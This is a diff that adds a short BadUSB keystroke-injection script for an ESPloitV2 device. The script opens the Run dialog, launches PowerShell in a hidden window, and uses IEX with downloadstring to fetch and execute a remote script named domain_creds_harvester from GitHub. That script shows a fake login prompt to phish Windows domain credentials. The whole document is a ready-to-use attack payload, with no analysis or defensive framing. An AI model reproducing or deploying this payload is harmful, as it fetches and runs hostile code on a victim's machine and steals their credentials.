@@ -1,0 +1,7 @@
+Rem: Pulls domain_creds_harvester and displays the login prompt 
+CustomDelay:1000
+Press:131+114
+CustomDelay:1000
+PrintLine:powershell.exe                                            
+CustomDelay:1000
+PrintLine: powershell -w 1 -c 'IEX (New-Object Net.Webclient).downloadstring(''https://raw.githubusercontent.com/purpleracc00n/BadUSB_Scripts/main/ESPloitV2/Windows/Phishing/domain_creds_harvester.ps1'');antani'
